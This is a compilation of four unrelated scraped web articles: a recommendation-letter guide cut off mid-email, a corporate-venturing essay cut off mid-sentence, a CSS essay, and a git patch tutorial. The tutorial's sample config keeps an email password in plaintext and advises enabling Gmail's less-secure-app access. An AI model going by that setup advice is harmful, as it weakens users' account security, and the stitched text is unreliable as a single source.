<p>All of these individuals would be classified as a good “recommender” to ask for a letter of recommendation.</p>

<p><strong>Tip:</strong> It can be useful to ask a professor for a letter of recommendation during their regularly scheduled office hours.</p>

<p>Recommendation letters can be useful for job seekers, students, and general professionals. They can be used to show a potential employer the worthiness of employment (competencies, skills, personal qualities, and meeting qualifications). Letters of recommendation can be useful for recent graduates who are applying for an internship program. And lastly, for students who are applying for a graduate program, financial aid, a scholarship, or other admissions committee requirements.</p>

<p><strong>Tip:</strong> If seeking a college recommendation letter, it’s best for students to ask for their letters of recommendation during junior year of their schooling. This can “beat the competition” when it comes to the other student body who may be requesting letters of recommendation from their teacher or other faculty. Students should provide their letter writers with their personal statement for college to help assist the writer in creating a great letter of recommendation.</p>

<h2>How to Ask for a Letter of Recommendation</h2>

<p>Below are steps for job seekers and students to consider when asking for a letter of recommendation:</p>

<ul>
<li>Gather a list of professionals, professors, or faculty to request a letter from.</li>
<li>Speak with each one over the phone or in person and request their positive letter of recommendation.</li>
<li>Send them an email outlining objectives for the letter and any job application or college application details (including the deadline). Or a cover letter, resume, and other candidate information.</li>
<li>Upon receiving the recommendation letter, send a thank you email for their time and effort.</li>
</ul>

<h3>Asking a teacher or professor to write a recommendation letter</h3>

<p>Include the following information in the email request to a professor or teacher.</p>

<p><strong>Classwork:</strong> It can be beneficial to write a summary document outlining classwork, grades, and achievements so that the professor can reference when writing the recommendation letter. A professor who teaches hundreds of students is going to need something to look at when they start to write a letter.</p>

<p><strong>A resume:</strong> Including a resume can be helpful for the request of a recommendation letter. It can show the professor what career path the student wants to take and what they are trying to communicate or convey to future employers through prior work experience, skills, and more.</p>

<p><strong>A deadline:</strong> Asking a professor to complete the recommendation letter by a certain date can ensure that the student receives the proper recommendation in a timely manner. This can ensure that the student doesn't miss the opportunity to submit the job application before waiting for the professor to complete the letter. This can be especially helpful if using the recommendation letter for a graduate study program or scholarship request.</p>

<p>Be sure to check school policies on asking for letters of recommendation. Some professors, teachers, and institutions force the student to submit a <a href="https://www.philau.edu/undergrad/inc/documents/recommendationform.pdf">recommendation form</a>. This form puts a formal request to the professor to ask for a letter of recommendation.</p>

<p><strong>Tip:</strong> Heard the term "rec letter?" A "rec letter" is a letter of recommendation or recommendation letter. This is a "slang" term for the name recommendation letter.</p>

<h2>When to Ask for a Recommendation Letter</h2>

<p>While it's more common to ask professionals to be a reference, asking for a letter of recommendation can happen at <strong>any</strong> time in a professional's career or student's tenure.</p>

<p>Contrary to what most professionals and students believe, there's always a great time to be asking for a letter of recommendation. The best time to ask for a letter of recommendation is when a professor or manager is impressed by the efforts of the letter requester. When this occurs, that is the perfect timing to be asking for a letter of recommendation.</p>

<p>For example, let's say a professional completed a major milestone, delivered for a client. And the manager was impressed with that work. During that time, it's best that the employee ask their manager for a letter of recommendation. It's best to confide in the manager and tell them that the letter of recommendation does not have any implication on current employment (the employee is not resigning) and the employee is asking for the confidential letter because it "feels like the right time."</p>

<p>Students can follow this same idea. When a professor or teacher is happy with the student's coursework, it may be a great time to be asking for a letter of recommendation. For a student, asking earlier than the other classmates can be a wonderful idea. Most students wait until the end of the year to request a letter of recommendation, forcing the professor to be "pressured" by a number of students applying to grad school or other post-secondary institutions.</p>

<p>The perfect time to ask for a letter of recommendation is when a significant <strong>accomplishment</strong> has been made. For professionals who have submitted their two weeks' notice, it's okay to ask the manager for a letter of recommendation toward the end of their employment. It's advised to ask the manager for a letter of recommendation before the final day of employment.</p>

<p>If an employee waits until the final day of employment to ask for a letter of recommendation, the manager might not feel "compelled" to provide a nice letter of recommendation to the employee. After providing a two weeks' notice, wait <strong>one week</strong> before asking for a letter of recommendation. <strong>Why</strong> Because submitting a two weeks' notice, then immediately requesting a letter of recommendation can be misinterpreted by the manager. It might communicate that the employee is "eager" to leave or resign from their position.</p>

<h2>How to Ask in Person</h2>

<p>Meeting by phone or in-person (face-to-face) to ask for a letter of recommendation is considered a polite act. Here's what to say when speaking with a professional or employer, asking for a letter of recommendation:</p>

<p>
"Thanks for speaking with me today Sarah. It's been an absolute pleasure being able to work with you. I feel like you've been a mentor to me and I'm sincerely grateful for being able to watch you work, learn from your work, and continue my career. I'd love it if you could be a reference for me and write a letter of recommendation for my future career efforts? I can provide insights into what I'm looking for a letter to display in terms of my skills, qualities, traits, and core competencies. Would you feel comfortable writing me a letter of recommendation?"
</p>

<h2>Recommendation Letter Request Email Sample</h2>

<p>Below is a sample letter request email. Job seekers and students should avoid writing a written request for a recommendation as it can take longer to receive the letter.</p>

<p>Email subject line: Recommendation Letter Request</p>

<div><p>
Hey John —</p><p>

I want to thank you for the opportunity to work together over the past few years. You’ve been a mentor to me, and I will be carrying everything you’ve educated me into my next role. I was hoping you might be able to write me a letter of recommendation that I can use for future employment opportunities.</p><p>

If possible, I’d love to refer to a couple of qualities that I think will assist me in my career:</p><ul>
<li>Leadership qualities and teamwork.</li>
<li>Time management and organizational skills.</li>
<li>Any other significant experiences you have had with me.</li>
</ul><p>

I would love to get the recommendation letter within the next 4 business days if I can.</p><p>

Thanks so much, John,<br>
Robert

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>In his classic book, “<a href="https://www.amazon.com/dp/B007AIXKUM">The Founder’s Dilemmas: Anticipating and Avoiding the Pitfalls That Can Sink a Startup</a>,” former Harvard Business School professor and startup researcher Noam Wasserman introduced the idea that most entrepreneurs have to make a deliberate choice between optimizing for financial returns (“Rich”) or optimizing for control of their company (“King”). His research showed that very few get to be both Rich <em>and</em> King — that’s the rare exception. Most founders typically must decide between “bootstrapping,” which maintains equity ownership but limits growth by having to self-fund growth initiatives via cash flow, or raising outside capital, which accelerates growth but risks diluting founder equity and diminishing the founder’s decision rights on the board of directors.<br></p><p>At High Alpha Innovation, we partner with large corporations to innovate via systematically launching new ventures and building corporate venture studios. We are fortunate to interact frequently with forward-looking executives who are always looking for novel ways to unlock meaningful growth. No matter which type of executive we speak to — a C-suite member, a business unit GM, an innovation leader, a corporate venture capital investor (“CVC”), or even a corporate development deal-junkie — they all seem to face the same Rich versus King tradeoff decision as the entrepreneurial founder when considering launching new ventures. (Note: we do not consider corporate divestitures of more established businesses to be a “new venture” for the purposes of this post).<br></p><p>On one side are executives that might push the organization to invest in a fast-growing VC-backed early stage startup, arguing that using the balance sheet to make a minority equity investment won’t impact the P&amp;L while delivering both high financial returns via eventual sale or IPO of the company as well as meaningful strategic returns through a commercial relationship with the startup that creates differentiation, accelerates time-to-market, or acquires expertise or talent for the corporation. This can be a compelling and valid argument.&nbsp;<br></p><p>On the other side are executives that might push the organization to build new ventures internally that are fully-owned and controlled, arguing this maximizes both financial returns (“we keep 100%, not just a minority”) as well as strategic returns (“we pick the team and dictate the roadmap, so we can customize the new venture to meet our unique strategic needs”). This is also a compelling and valid argument.<br></p><p>Both CVC and internal venture investments have the ability to meet or exceed expectations, but it is <em>always</em> harder than corporations expect and never goes exactly to plan. Many senior corporate executives we speak to, off the record, are frustrated with their CVC investments and internal venturing efforts falling short of lofty financial and strategic goals. “So, which is the better approach: CVC investing or internal venturing?!”&nbsp;<br></p><p>We believe this is the wrong question to ask and a false dichotomy. Successful corporate innovation requires a portfolio approach and having many different tools in the toolkit (e.g. M&amp;A, partnerships, etc.). In certain circumstances CVC investing makes sense and in other circumstances internal innovation may be the better path (a likely topic for a future post). Each tool in the corporate innovation toolkit has its own pros and cons.&nbsp;<br></p><p><strong><em>The right question to ask is why a particular investment did not deliver against expectations. At High Alpha Innovation, we believe many corporations are setting themselves up for failure because they do not consider the tradeoff between being “Rich” or being “King,” and do not explicitly make the hard decision to optimize for one and manage to the other (or somewhere in between - more on that later). They want to have their cake and eat it too, but many times it can end up in their face. This difficult tradeoff decision is what we call the Corporate Founder's Dilemma.</em></strong></p><p>For CVC funds that are structured and operate like standalone VC funds (such as <a href="https://www.gv.com/"><strong>GV</strong></a>, which spun out of Google in 2009), having control or influence over the operations of a portfolio company is usually less of an issue as the CVC has already made the explicit decision to optimize for financial returns. But it’s much more tricky for most corporations whose CVC arms have both a financial and strategic mandate. We believe CVC investments have a higher likelihood of making the corporation “Rich” than internal ventures, as external startups can move faster, tap into the private capital markets to accelerate growth, attract top talent, and avoid the typical innovation barriers within corporations. Strategic returns are harder to deliver, though, as it is hard for many corporations to NOT act like a “King” as they may be used to calling all the shots with vendors and partners. Most CVC investors understand that the corporation is giving up control or influence, but we’ve seen many of the commercial relationship owners between the corporation and startup not understand this, or simply do not accept it. These internal commercial leaders are focused (rightly so) on optimizing for internal business unit success and this can lead them to misinterpret or misuse the CVC investment as a right to force the startup to do whatever it takes to make the internal leader and business unit successful. In our experience, this misalignment of incentives between internal commercial owner, CVC and startup management teams can irreparably damage the relationship when not managed closely and lead to missed financial and strategic targets for both the corporation and the startup.<br></p><p>In regards to internal wholly-owned ventures, if a corporation owns 100% of the new venture, staffs it with salaried and bonused employees without equity ownership, and shares centralized services (e.g. finance, accounting, etc.) with the core business, we see that as just a new business unit no matter what the corporation might want to call it. We hear about many of these “new ventures” (or business units) struggling to gain internal or external traction. We believe this is because most internal ventures are “bootstrapping” without even realizing it. Established public corporations, just like bootstrapped startups, typically self-fund internal growth initiatives through cashflows meaning the growth capital available to new ventures is inherently quite limited. Many innovation leaders we speak with find it incredibly hard to raise sufficient internal capital, especially within public companies that face short-term pressures from Wall Street, for new ventures that typically lose money in the near-term and have uncertain payoffs in the longer-term. Even if a new internal venture can land some internal seed capital and begin to show traction that might warrant additional funding to accelerate growth, allocation of this scarce growth capital is constrained to specific times of year (e.g. annual budgeting) rather than released as appropriate based on performance-based milestones. To boot, these internal ventures also face most, if not all, of the other typical corporate innovation challenges: fighting for scarce resources and internal talent, spending significant time building internal consensus and overcoming bureaucracy, struggling to land exceptional entrepreneurial leaders who dream big and don’t want to work on a salary, and so on. These barriers and the lack of access to sufficient capital and talent often creates “zombie” ventures that are marketed externally as successful innovation (see Innovation Theater), but don’t ever scale to a point where senior corporate leaders acknowledge the venture as a meaningful contributor to corporate growth. In our experience, wholly-owned ventures allow the corporation to act like a “King” and call the shots, but are much less likely to make the corporation “Rich” than CVC investments.&nbsp;<br></p><p><strong>At High Alpha Innovation, we believe the best outcomes come when a corporation explicitly and thoughtfully makes the hard tradeoff between being Rich and being King. Not making a decision, or trying to maximize both, is counterintuitively why many CVC investments and internal ventures fail. Acknowledging this tradeoff and setting the right expectations within the corporation is half the battle.&nbsp;</strong><br></p><p>CVCs must ensure internal commercial owners understand and accept that they will be giving up a significant level of control and train them to treat CVC-backed startups more as strategic partners and less as vendors that they can push around. Innovation leaders who decide they’d prefer to be “King” and fully control a new internal venture must ensure corporate leaders understand and appreciate the capital, talent, and new incentive structures that will be required to scale the new venture over time into a financially meaningful business unit or subsidiary. This might involve convincing the corporation to set aside multi-year funding that the new venture can “unlock” when it hits predetermined milestones regardless of when the milestones are hit. This also might involve getting sign off for new financial incentive structures tied to performance of the new venture that enable key employees to share in the upside (e.g. Stock Appreciation Rights/Phantom Equity, or corporate grants/options tied to specific metrics). Regardless of the tool (CVC or new ventures), we think it’s vitally important for corporations to optimize for one and manage to the other.&nbsp;<br></p><p><strong>However, another good option has emerged recently that lies somewhere in between internal ventures and CVC investments: the majority-owned corporate-founded startup.&nbsp;</strong><br></p><p>We believe this novel approach, when executed well, can deliver financial returns closer to that of CVC investments while also giving corporations a bit more influence over the startup’s strategic direction and product roadmap. This is not about striving to be both Rich and King, it is about sharing some of the returns and some of the control. It’s an effective …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The key reason why you (and likely most developers) struggle with CSS, is that you underestimate it.</p><p>Underestimating CSS leads to a strange feeling of tediousness when writing it, which makes having to deal with it a laborious and seemingly unrewarding task. Style by style, div by div, media query by media query. Having to make endless small tweaks in what feels like an open-ended ‘design’ process with no direction at all can feel like torture to a development-oriented mind.</p><p>Not to mention a complete lack of debugging tools and methods available for when things go wrong.</p><p>This underestimation is a subset of a problem that we developers tend to have with design in general. In short, we don’t think it’s that important. We don’t understand or appreciate its <em>meaning</em>.</p><p>In reality, CSS is as complicated, maybe more so, as any programming language or framework you will ever come across.</p><p>But the general feeling that it is an afterthought within the development process overall, only adds fuel to fire of the thought that leads you to feel that it is tedious.</p><p>The best way to start to get better at it then, is to gain a new appreciation for it, as a 'hard', technical thing. Which it is.</p><p><strong>You do this by reframing how you see it.</strong></p><p>You can start to learn to like CSS by understanding it from a problem solving technical aspect. As an act of 'constructing' a page rather than 'designing' it. By <a target="_blank" title="https://simpleprogrammer.com/information-architecture-developers-learning-design/" href="https://simpleprogrammer.com/information-architecture-developers-learning-design/">engaging the engineering side of your mind</a>.</p><p>Instead of seeing CSS as an annoying way to 'style' pages, see it instead as a visual programming language for constructing visual guides (UI's) for your user.</p><p>You don't 'style' pages, you 'construct' and 'architect' them. It sounds weird to use these words, but they have a massive effect on changing your perception of what you're doing. And that has a massive effect on your impression and willingness to learn how to do it well.</p><p>Essentially, you can properly learn CSS by transforming it in your mind from a 'styling' problem thing, to an 'engineering' problem thing.</p><p>This defeats the feeling of tedium that your mind has when you’re dealing with CSS, and over time, if applied with some of the specific additional tactics that I will explain below, leads to actually _enjoying_ the process of writing CSS.</p><h2>Tactics That Reduce CSS Tediousness &amp; Lead To CSS Enjoyment</h2><p>Once you’ve started to reframe the act of utilizing CSS in your mind, and start to see it as more of a tool for an engineering problem rather than a ‘design’ problem, embers of enjoyment will start to emerge within you as you are writing your CSS. From here, you can start to add some fuel to the growing fire. </p><p>You can do this by utilizing some strategies, tools and techniques that further reduce the tediousness of CSS. </p><p><strong>Let’s go through them.</strong></p><h3>Use tediousness reducing tools, such as <a target="_blank" title="https://tailwindcss.com/" href="https://tailwindcss.com/">TailwindCSS</a>. So you can abstract CSS.</h3><p>I remember back a few years ago when the <a target="_blank" title="https://laravel.com/" href="https://laravel.com/">Laravel Framework</a> came out. PHP Programmers all over the web were fawning over it. The most common phrase I heard was that it gave programmers “their enjoyment of programming” back. This with a language that was notoriously derided as one that was tedious to use.</p><p>What Laravel did was abstract a lot of the annoying parts of most of these developers' workflows when writing PHP code. These developers, at this newfound higher level of abstraction, could now focus on ‘crafting’ their applications, becoming ‘artisans’ of their code rather than simply PHP programmers.</p><p>TailwindCSS does the same thing for CSS. Instead of moving from one file to another to define your styles, Tailwind uses standard default class presets that allow you to write your CSS, essentially directly onto your HTML elements. This <a target="_blank" title="https://news.ycombinator.com/item?id=24034619" href="https://news.ycombinator.com/item?id=24034619">might sound weird</a> at first, but in the end, actually results in a LOT of saved time in development.</p><p>Over time, it, along with other tools, such as Flexbox, also massively increases enjoyment, as you start to intuitively ‘craft’ and construct pages at a higher level of abstraction, rather than simply ‘style’ them.</p><p><strong>Fun fact</strong><strong>:</strong> The creator of TailwindCSS, <a target="_blank" title="https://twitter.com/adamwathan" href="https://twitter.com/adamwathan">Adam Wathan</a> actually started out as a Laravel Developer, so maybe that enthusiasm crossed over to his other project areas.</p><p><strong>EDIT</strong><strong>:</strong> I recently came across a very nice feature in Firefox that helps in debugging overflow issues (one of the most common CSS problems). You can see it in action <a target="_blank" title="https://twitter.com/violasong/status/1314406711696912386" href="https://twitter.com/violasong/status/1314406711696912386">here</a>.</p><h3>Understand how to solve common problems in CSS</h3><p>Because of the lack of debugging tools that are currently available for CSS. Most of debugging within it largely consists of cross-referencing ways that others have dealt with the issue you’re currently facing.</p><p>While this is likely not an uncommon practice in your development workflow (its why StackOverflow exists), it is very time consuming if it is the ONLY way that you can debug. </p><p>One way around this issue is to become familiar with the most common pattern of problems that occur within CSS, and then try to build a repository of solutions to those problems in your mind over time. This sounds simple enough but it very dramatically decreases tedium and increases productivity and speed of development, which ultimately increases your enjoyment.</p><p>For example, one of the most common issues, as referenced in the post drawing, is ‘overflow’ of elements occurring within the page. Sometimes causing the entire page itself to overflow at certain screen sizes. A tutorial like this, outlines the best way to solve this problem.</p><p><strong>Sidenote</strong><strong>:</strong> We are creating a short ebook that deals with this problem, by outlining these most common CSS problems and their solutions, you can sign up for notification of this here: <a target="_blank" title="https://forms.gle/tXRMnpyUZiFmvZwK8" href="https://forms.gle/tXRMnpyUZiFmvZwK8">How To Debug CSS</a>.</p><h3>Master layouts and positioning in CSS (the most tedious aspect of it)</h3><p>As a follow-on to the above point on simply gaining an understanding of the most common aspects of the CSS writing process, the most common of these in terms of general page creation, is that of simply layout out a page, and its elements and making sure that they are positioned and aligned properly. </p><p>The best way to approach problems in a way that solves them most effectively is in an 80/20 way. Mastery of layouts and positioning is the 20% that leads to the 80% of results with CSS. And what will have the most dramatic effect on reducing the tediousness of your CSS writing process.</p><p>Using tools such as Flexbox, as is mentioned above, also makes layouts and positioning twice as easy, once you understand the fundamentals behind it. </p><p>Overall, it’s with this knowledge that you may start to enjoy and view the process as ‘constructing’ pages, rather than simply ‘styling’ them.</p><h3>Practice regularly until it becomes second nature</h3><p>One simple thing that I found, as I started to implement some of the tactics above into my own workflow, was that as I became more proficient in writing CSS and it started to become second nature, my enjoyment of it also started to increase, which lead to a positive feedback loop that kept increasing my overall ability.</p><p>This is a very positive flywheel that I highly encourage. Once you’ve started to change your mindset about CSS and use the right tools to abstract a lot of the tediousness out of it, practicing it regularly is then like adding jet fuel to your workflow. Eventually, CSS will become something you look forward to, rather than an afterthought that you try to avoid.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Back when I was studying CS at university, we had assignments to code various algorithms. When the assignments were due we were supposed to execute the code in laboratory systems and get the output checked by the professors. I liked coding and tinkering with the algorithms; some of my classmates didn’t. They used to copy the code from my system on a USB stick and execute them on their system and get done with it. I didn’t judge them but I was tired of giving each one their copy and sometimes also instructing them how to execute that piece of code. In one such assignment, I uploaded the code on GitHub and shared the <a href="https://github.com/tarunbatra/re2nfa" target="_blank" rel="noopener">link</a> with anybody who asked. <strong>Unknowingly, I had made my first open source contribution.</strong></p>
<p>A lot of people have similar stories and for most, Github is synonymous with Open Source. One thing that is also used interchangeably with Github is git. Even though these are three different entities, a lot of developers including me have never contributed to open source or used git without Github. Thus I was surprised when I learned that famous open source projects like Linux were not on Github even though they used git. Also, git was around before Github, so there must be other more native ways in git to get things done. I wondered how it worked but didn’t do anything about it until recently when I decided to experience a git only development workflow.</p>
<h2 id="Git-server-access"><a href="#Git-server-access" title="Git server access"></a>Git server access</h2><p>We use version control systems broadly for two use cases – to contribute to a repository where we have write access; to contribute to a public repository where we don’t have write access. To collaborate with developers to whom access can be given, Github or other platforms are not necessary. Anybody can host a <a href="https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server" target="_blank" rel="noopener">Git server</a> that can be used to host repositories. Developers can clone, push to, and pull from these remote repositories once access is granted to their ssh identity.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git clone origin git@&lt;host&gt;/&lt;repo&gt;.git</span><br></pre></td></tr></tbody></table></figure>

<p>This is similar to how we upload our SSH keys to Github or other platforms for being able to clone the repositories using SSH.</p>
<h2 id="Pull-requests"><a href="#Pull-requests" title="Pull requests"></a>Pull requests</h2><p>One thing which is missing in the above-mentioned method is the ability to create Pull Requests, get them reviewed and merged into the code. It becomes a big issue when the developers don’t have write access to the repositories as is the case in open source development. General open source flow is to fork a repository, push the changes in your forked repositories, and create a <strong>pull request</strong> to the original repository from where the maintainers can review and merge. Pull request is not a feature of git, but of platforms like Github. Collaborative development in git has the following steps:</p>
<ol>
<li>Clone the original repository</li>
<li>Create a patch</li>
<li>Send the patch to the maintainer</li>
<li>The maintainer applies the patch and pushes the code</li>
</ol>
<p>We introduced two new processes in this workflow – creating a patch and applying a patch. Let’s discuss them further.</p>
<hr>
<h3 id="Patch"><a href="#Patch" title="Patch"></a>Patch</h3><p>A patch is a diff of code and metadata around it. A diff is the actual code change which can be viewed using the command <code>git diff</code>. It is a Unix concept that is way older than git and Unix systems even have a builtin tool, <a href="https://man7.org/linux/man-pages/man1/diff.1.html" target="_blank" rel="noopener"><code>diff</code></a> which compares changes between two files. Its output can then be saved to a file that can be processed by another utility tool called <code>patch</code> which updates one of the files to make its content identical to another file.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>touch original.txt new.txt</span><br><span><span>echo</span> <span>"New addition"</span> &gt; new.txt</span><br></pre></td></tr></tbody></table></figure>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>diff original.txt new.txt -u &gt; changes.patch</span><br></pre></td></tr></tbody></table></figure>
<figure><figcaption><span>changes.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+New addition</span></span><br></pre></td></tr></tbody></table></figure>
<p>If we want to update the original file with the contents of the new one, we need to “patch” it.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>patch original.txt changes.patch</span><br></pre></td></tr></tbody></table></figure>
<p><strong>NOTE:</strong> <em>Use <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github repository</a> to practice this example and all the ones which are to follow.</em></p>
<p>Now that we understand the concepts of diff and patch, we can proceed with using them in git. To generate a patch file in git, we need to use <code>git format-patch</code> command.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git format-patch HEAD~1..HEAD</span><br></pre></td></tr></tbody></table></figure>

<p>This will create a patch file for the latest commit. Tinker with the argument to produce patch files for other commits too. By default, each file represents a single commit and the file name is of the format <code>0001-&lt;commit message&gt;.patch</code>. Interestingly, it is in <a href="https://en.wikipedia.org/wiki/Mbox" target="_blank" rel="noopener">Unix mbox</a> format which means it has some email-like metadata (from, subject, etc.) followed by the patch data.</p>
<figure><figcaption><span>0001-Added-Tarun-Batra-to-contributors.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span>From 619814a3ac21012580e725136864e8397c14e20b Mon Sep 17 00:00:00 2001</span><br><span>From: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date: Tue, 20 Oct 2020 23:15:32 +0200</span><br><span>Subject: [PATCH] Added Tarun Batra to contributors</span><br><span></span><br><span></span><br><span> CONTRIBUTORS.txt | 1 +</span><br><span> 1 file changed, 1 insertion(+)</span><br><span></span><br><span>diff --git a/CONTRIBUTORS.txt b/CONTRIBUTORS.txt</span><br><span>index e69de29..1d12219 100644</span><br><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span></span><br><span><span>--</span></span><br><span>2.28.0</span><br></pre></td></tr></tbody></table></figure>
<p>This is the patch file I created to add my name to the contributors’ list of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository as an exercise for myself.</p>
<hr>
<h3 id="Apply"><a href="#Apply" title="Apply"></a>Apply</h3><p>We have a patch file which we can send to the maintainers so that they can apply the patch. We can either use traditional ways to send the patch or use git itself, but more on it later. In this section, we will explore the process to apply a patch.</p>
<p><code>git apply &lt;patch file&gt;</code> is a command which applies the changes described in the patch file locally but does not commit them. They will appear in our workspace and we can stage them and commit them. This is not ideal as even though we get the changes, the commit metadata like author name and message is lost. A better way to apply patches is <code>git am</code> (abbrev. for “apply mailbox”).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git am --signoff &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>The flag <code>--signoff</code> is used if the commit message needs to be appended with a “Signed-off-by” line to indicate who applied the commit. Below is the signed-off and applied commit for the patch we generated as an exercise in the last section.</p>
<figure><figcaption><span>git log</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>Author: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date:   Tue Oct 20 23:15:32 2020 +0200</span><br><span></span><br><span>    Added Tarun Batra to contributors</span><br><span></span><br><span>    Signed-off-by: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h3 id="Sending-the-patch"><a href="#Sending-the-patch" title="Sending the patch"></a>Sending the patch</h3><p>Now we can explore how to send a patch file to a maintainer in the “git” way. There are two ways that I know of –</p>
<ol>
<li><p>imap-send</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git imap-send &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will upload the email to an IMAP folder from where it can be sent. To use it we need to add IMAP server details in our <code>~/.gitconfig</code> file. I use Gmail so my IMAP details look like:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>[imap]</span></span><br><span>	folder = "[Gmail]/Drafts"</span><br><span>	host = imaps://imap.gmail.com</span><br><span>	user = email@gmail.com</span><br><span>	pass = yourpassword</span><br><span>	port = 993</span><br></pre></td></tr></tbody></table></figure>
<p>Gmail allows its IMAP server to be used if the <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Less secure app access</a> setting is turned on.</p>
</li>
<li><p>send-email</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git send-email --to=&lt;email&gt; &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will use an SMTP server to send email. The corresponding config to use this command is:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>[sendemail]</span></span><br><span>	smtpEncryption = tls</span><br><span>	smtpServer = &lt;host&gt;</span><br><span>	smtpUser = &lt;user&gt;</span><br><span>	smtpServerPort = 587</span><br></pre></td></tr></tbody></table></figure>
<p>Both of these methods can be used to send an email per patch file. The subject of the commit by default is of the format <code>[PATCH] &lt;commit message&gt;</code>.</p>
</li>
</ol>
<p><strong>NOTE:</strong> <em>Sender email addresses can be spoofed quite easily and this raises the question of authentication and authorization when submitting patches. I tried creating patches of PGP signed git commits but the patch doesn’t retain the PGP signature. We could encrypt the email itself using PGP but that’s a lot of extra work for both the contributor and the maintainer.</em></p>
<p>So what can we do with this newly acquired knowledge?</p>
<ol>
<li>Git patches often <a href="https://lkml.org/lkml/2020/10/16/629" target="_blank" rel="noopener">float</a> <a href="https://lkml.org/lkml/2020/10/19/82" target="_blank" rel="noopener">around</a> in the Linux development mailing list and it gives me satisfaction that I understand how they work a little better now than before.</li>
<li>When platforms like Github and Gitlab have an outage, work in most of the development teams stall. Now I know a way to get my code reviewed even in these situations. (Okay, that might be a stretch)</li>
<li>EDIT: About when this article was published, <a href="https://yt-dl.org/about.html" target="_blank" rel="noopener"><code>youtube-dl</code></a> was taken down by Github due to <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md" target="_blank" rel="noopener">a DMCA request</a>. The whole episode brings to light that Github being a platform is subject to censorship, unlike git which is distributed.</li>
</ol>
<p>You can practice for yourself by adding your name to the <code>CONTRIBUTORS.txt</code> file of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository, committing it, and then sending me the patch. I would readily <del>merge</del> apply it. 😀</p>
